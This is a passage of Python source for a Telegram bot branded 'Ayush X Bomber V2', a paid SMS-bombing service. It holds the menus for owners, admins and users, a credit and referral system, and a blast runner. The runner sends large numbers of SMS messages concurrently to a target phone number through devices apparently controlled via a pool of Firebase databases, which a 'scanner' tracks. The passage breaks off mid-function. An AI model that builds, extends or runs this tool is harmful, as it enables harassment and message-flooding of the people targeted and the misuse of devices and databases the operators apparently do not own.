            btn("✍️ ᴄᴜsᴛᴏᴍ ᴛɪᴍᴇ", f"{prefix}:dur:custom", EMOJI_MONEY, "✍️", style="success"),
            btn("❌ ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")
        ]
    ])

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (f"🔴 {sc('disable free')}", "owner:free:off", "danger") if d.get("free_mode") else (f"🟢 {sc('enable free')}", "owner:free:on", "success")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_CHECK, "✅", style="success"), btn("ғɪʀᴇʙᴀsᴇ", "owner:fb:menu", EMOJI_FIRE, "🔥", style="danger")],
        [btn("ᴛᴏᴘ ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏ", "owner:top_video:menu", EMOJI_TOP, "⭐", style="success"), btn("ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "🎬", style="primary")],
        [btn("sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary"), btn("ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary")],
        [btn("ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥", style="success"), btn("ʙᴀɴ", "owner:ban", EMOJI_CROSS, "❌", style="danger")],
        [btn("ᴜɴʙᴀɴ", "owner:unban:menu", EMOJI_CHECK, "✅", style="success"), btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊", style="success"), btn("ᴀᴄᴛɪᴠɪᴛʏ", "owner:activity", EMOJI_GEAR, "📜", style="primary")],
        [btn("ᴘʀɪᴄɪɴɢ", "owner:pricing:menu", EMOJI_MONEY, "💳", style="success"), btn("ᴘᴇɴᴅɪɴɢ ʙᴜʏs", "owner:buy:pending", EMOJI_MONEY, "🛒", style="danger")],
        [btn("ʀᴇᴅᴇᴇᴍ", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="success"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰", style="primary")],
        [btn("ᴅᴇᴅᴜᴄᴛ", "owner:credits:deduct", EMOJI_CROSS, "❌", style="danger"), btn("ᴀᴅᴅ ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰", style="success")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "❌", style="danger"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"), btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋", style="primary")],
        [btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍ", "owner:protect", EMOJI_LOCK, "🔒", style="danger"), btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary")],
        [btn("ᴛʀᴀᴄᴋ ɴᴜᴍ", "owner:track", EMOJI_STAR, "📍", style="success"), btn("ᴇxᴘᴏʀᴛ", "owner:export_script", EMOJI_GEAR, "📤", style="primary")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1], style=mode_btn[2])],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_CHECK, "✅", style="success"), btn("ᴛᴏᴘ ᴠɪᴅᴇᴏ", "owner:top_video:menu", EMOJI_TOP, "⭐", style="primary")],
        [btn("ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "🎬", style="primary"), btn("ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="success")],
        [btn("sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="success"), btn("ʙᴀɴ", "admin:ban", EMOJI_CROSS, "❌", style="danger")],
        [btn("ᴜɴʙᴀɴ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success"), btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("ɴᴏᴛᴇs", "admin:notes:menu", EMOJI_GEAR, "📝", style="primary"), btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    """Colorful custom buttons matching SS screenshot 2 exactly"""
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("💣 sᴛᴀʀᴛ ʙʟᴀsᴛ 💣", "user:send", EMOJI_ROCKET, "💣", style="success")],
        [
            btn("💰 ᴍʏ ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💰", style="primary"),
            btn("🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ", "user:redeem", EMOJI_GIFT, "🎁", style="success")
        ],
        [
            btn("👥 ʀᴇғᴇʀ & ᴇᴀʀɴ", "user:refer", EMOJI_CHECK, "👥", style="primary"),
            btn("📊 ᴍʏ sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊", style="primary")
        ],
        [
            btn("📜 sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_ROCKET, "📜", style="primary"),
            btn("💳 ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:buy_menu", EMOJI_MONEY, "💳", style="success")
        ],
        [btn("🎰 ᴅᴀɪʟʏ sᴘɪɴ 🎁", "user:dailyspin", EMOJI_GIFT, "🎰", style="success")],
        [btn("ℹ️ ɪɴғᴏ & ʜᴇʟᴘ", "user:info", EMOJI_GEAR, "ℹ️", style="primary")]
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴀʟʟ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑", style="danger")]
    ]
    for idx in range(len(videos)):
        rows.append([btn(f"ᴠɪᴅᴇᴏ #{idx+1}", "noop", EMOJI_VIDEO, "📹"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def top_video_menu_kb(d: dict) -> InlineKeyboardMarkup:
    top = d.get("top_video")
    rows = []
    if top:
        rows.append([btn("ᴄʜᴀɴɢᴇ ᴛᴏᴘ ᴠɪᴅᴇᴏ", "owner:top_video:set", EMOJI_CHECK, "🔄", style="success")])
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴛᴏᴘ ᴠɪᴅᴇᴏ", "owner:top_video:remove", EMOJI_CROSS, "🗑", style="danger")])
    else:
        rows.append([btn("sᴇᴛ ᴛᴏᴘ ᴠɪᴅᴇᴏ", "owner:top_video:set", EMOJI_CHECK, "➕", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict) -> InlineKeyboardMarkup:
    bot_fbs = d.get("firebases", [])
    backup_fbs = d.get("backup_firebases", [])
    rows = [
        [btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ᴠɪᴀ ᴛxᴛ ᴜᴘʟᴏᴀᴅ", "owner:fb:add_file", EMOJI_CHECK, "📄", style="primary")],
        [btn("ʀᴇʟᴏᴀᴅ ʙᴀᴄᴋᴜᴘ", "owner:fb:reload_backup", EMOJI_GEAR, "🔄", style="primary")],
        [btn("ᴄʟᴇᴀʀ ʙᴀᴄᴋᴜᴘ", "owner:fb:clear_backup", EMOJI_CROSS, "🗑", style="danger")],
    ]
    for fb in bot_fbs[:10]:
        rows.append([
            btn(fb.get("label", fb["url"][:24])[:24], "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}", EMOJI_CROSS, "🗑", style="danger")
        ])
    if len(bot_fbs) > 10:
        rows.append([btn(f"+{len(bot_fbs)-10} ᴍᴏʀᴇ", "noop", EMOJI_GEAR, "➕")])
    if backup_fbs:
        rows.append([btn(f"📁 {len(backup_fbs)} ʙᴀᴄᴋᴜᴘ", "noop", EMOJI_GEAR, "📁")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕", style="success")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕", style="success")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned[:20]:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])
    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")
    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0:
        nav.append(btn("◀ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀", style="primary"))
    if start + per < len(items):
        nav.append(btn("ɴᴇxᴛ ▶", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶", style="primary"))
    if nav:
        rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

# ═══════════════════════════════════════════════════════════════
# ║  PANEL TEXT BUILDERS (MATCHING SS 2)
# ═══════════════════════════════════════════════════════════════
def owner_panel_text(d: dict) -> str:
    fbs = get_all_firebases(d)
    bot_fbs = d.get("firebases", [])
    backup_fbs = d.get("backup_firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    top = d.get("top_video")
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    pending_buys = len([r for r in d.get("buy_requests", {}).values() if r.get("status") == "pending"])
    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b> ({len(bot_fbs)} ʙᴏᴛ + {len(backup_fbs)} ʙᴀᴄᴋᴜᴘ)\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_TOP, '⭐')} ᴛᴏᴘ ᴠɪᴅᴇᴏ     : <b>{'✅ sᴇᴛ' if top else '❌ ɴᴏɴᴇ'}</b>\n"
        f"{em(EMOJI_MONEY, '🛒')} ᴘᴇɴᴅɪɴɢ ʙᴜʏs : <b>{pending_buys}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    top = d.get("top_video")
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_TOP, '⭐')} ᴛᴏᴘ ᴠɪᴅᴇᴏ     : <b>{'✅ sᴇᴛ' if top else '❌ ɴᴏɴᴇ'}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(get_all_firebases(d))}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = get_all_firebases(d)
    credits = udata.get("credits", 0)
    uses = udata.get("uses", 0)
    devices_count = len(CACHED_DEVICES) if CACHED_DEVICES else 0
    return (
        f"💣 <b>Ayush X Bomber V2</b>\n\n"
        f"👤 <b>MY ACCOUNT</b>\n"
        f"🆔 User ID » <code>{uid}</code>\n"
        f"👑 Rank » ⏳ ACTIVE (29d 23h)\n"
        f"Access » 🟢 29d 23h left\n"
        f"💲 Credits » {credits}\n"
        f"Uses » {uses} times\n\n"
        f"🌐 <b>ENGINE STATUS</b>\n"
        f"🔥 API Pool » {len(fbs)} Firebase DBs\n"
        f"⚡ Status » 🟢 ONLINE & READY\n"
        f"🔄 Scanner » 🟢 {devices_count} DEVICES\n\n"
        f"Hit 💣 <i>START BLAST</i> to begin 👇"
    )

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs_map = {fb["id"]: fb for fb in get_all_firebases(d)}
    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in list(api_use.items())[:15]:
        fb = fbs_map.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

# ═══════════════════════════════════════════════════════════════
# ║  ROUTER + HELPERS
# ═══════════════════════════════════════════════════════════════
R = Router()

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        session = await get_http_session()
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
        async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            res = await resp.json()
            if res.get("ok"):
                msg_id = res["result"]["message_id"]
                await asyncio.sleep(2)
                del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception:
        pass

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Channel log failed: {e}")

# ═══════════════════════════════════════════════════════════════
# ║  /start HANDLERS (EXACTLY AS REQUESTED WITH TOP VIDEO & BUTTONS)
# ═══════════════════════════════════════════════════════════════
@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    d = load()
    is_new = reg_user(uid, name, d)
    
    if is_new:
        welcome = d.get("settings", {}).get("welcome_credits", 0)
        if welcome > 0:
            add_credits(uid, welcome, d)
            d["users"][str(uid)]["welcome_claimed"] = True
        save(d)
        username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
        log_text = (
            f"🆕 <b>NEW USER</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>ID:</b> <code>{uid}</code>\n"
            f"🌐 {username}\n"
            f"📅 {fmt_time(int(time.time()))}"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    
    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, m, ref = process_referral(uid, code, d)
            if success and ref:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    ref_credits = d["settings"].get("ref_credits", 0)
                    msg_txt = f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka code use kiya!"
                    if ref_credits > 0:
                        msg_txt += f"\n{em(EMOJI_MONEY, '💰')} +{ref_credits} credits mile."
                    await msg.bot.send_message(ref, msg_txt, parse_mode="HTML")
                except: pass
        save(d)
    
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    
    # Send Top Video if configured, attached with inline buttons directly
    top = d.get("top_video")
    if top and top.get("file_id"):
        try:
            caption = top.get("caption", user_home_text(uid, d))
            await msg.bot.send_video(
                msg.chat.id, video=top["file_id"],
                caption=caption,
                reply_markup=user_kb(), parse_mode="HTML"
            )
            return
        except Exception:
            pass
    
    # Route by role
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Banned!</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi!</b>\nOwner se approval lein.", parse_mode="HTML")
        return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    d = load()
    is_new = reg_user(uid, name, d)
    if is_new:
        welcome = d.get("settings", {}).get("welcome_credits", 0)
        if welcome > 0:
            add_credits(uid, welcome, d)
        save(d)
        username = f"@{msg.from_user.username}" if msg.from_user.username else "No"
        log_text = f"🆕 <b>NEW USER</b>\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {username}\n📅 {fmt_time(int(time.time()))}"
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    else:
        save(d)
    
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    
    # Top video handling with attached inline buttons
    top = d.get("top_video")
    if top and top.get("file_id"):
        try:
            caption = top.get("caption", user_home_text(uid, d))
            await msg.bot.send_video(
                msg.chat.id, video=top["file_id"],
                caption=caption,
                reply_markup=user_kb(), parse_mode="HTML"
            )
            return
        except: pass
    
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} Banned!", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Access nahi!", parse_mode="HTML")
        return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:start_now")
async def user_start_now(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
    await cq.answer("🚀")

# ═══════════════════════════════════════════════════════════════
# ║  SMS BLAST RUNNER (COUNT/DURATION BASED)
# ═══════════════════════════════════════════════════════════════
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Already running!</b> Stop first.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]
        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session
    
    is_regular = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular else None
    speed_label = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"
    
    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Progress send fail: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return
    
    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta: Dict[str, dict] = {}
    last_update = time.time()
    start_time = time.time()
    
    send_jobs = []
    for device in devices:
        sims = device["sims"]
        sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
        for _ in range(3):
            for sim in sim_slots:
                if len(send_jobs) < count:
                    send_jobs.append((device["fb_url"], device["dev_id"], sim, device["fb_id"]))
    
    while len(send_jobs) < count:
        for device in devices:
            if len(send_jobs) >= count:
                break
            sims = device["sims"]
            sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
            for sim in sim_slots:
                if len(send_jobs) >= count:
                    break
                send_jobs.append((device["fb_url"], device["dev_id"], sim, device["fb_id"]))
    
    send_jobs = send_jobs[:count]
    send_sem = asyncio.Semaphore(_MAX_CONCURRENT_SENDS)
    
    async def do_one(job_idx: int, job):
        nonlocal sent_ok, sent_fail, msgs_left, last_update
        async with send_sem:
            if session.cancelled or msgs_left <= 0:
                return
            fb_url, dev_id, sim, fb_id = job
            ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
            
            async with session.lock:
                if ok:
                    sent_ok += 1
                    if is_regular:
                        d_temp = load()
                        deduct_credits(uid, 1, d_temp)
                        d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                        k = str(uid)
                        if k in d_temp["users"]:
                            d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                        d_temp.setdefault("sms_history", {}).setdefault(k, []).append({
                            "number": number, "message": message[:100],
                            "timestamp": int(time.time()), "status": "sent"
                        })
                        save(d_temp)
                else:
                    sent_fail += 1
                msgs_left -= 1
                
                if fb_id not in api_usage_delta:
                    api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                api_usage_delta[fb_id]["sent" if ok else "failed"] += 1
                
                now = time.time()
                if (now - last_update >= _PROGRESS_UPDATE_INTERVAL or
                    (sent_ok + sent_fail) >= count or session.cancelled):
                    current_credits_live = get_user_credits(uid, load()) if is_regular else None
                    try:
                        await progress_msg.edit_text(
                            progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label),
                            reply_markup=stop_send_kb() if not session.cancelled else None,
                            parse_mode="HTML"
                        )
                    except TelegramBadRequest:
                        pass
                    except TelegramRetryAfter as e:
                        await asyncio.sleep(e.retry_after)
                    last_update = now
            
            await asyncio.sleep(speed)
    
    tasks = [asyncio.create_task(do_one(i, job)) for i, job in enumerate(send_jobs)]
    session.task = asyncio.gather(*tasks, return_exceptions=True)
    
    try:
        await session.task
    except Exception as e:
        log.error(f"Send loop err: {e}")
    finally:
        async with session.lock:
            session.sent = sent_ok
            session.failed = sent_fail
    
    was_cancelled = session.cancelled
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]
    
    d_final = load()
    if not is_regular:
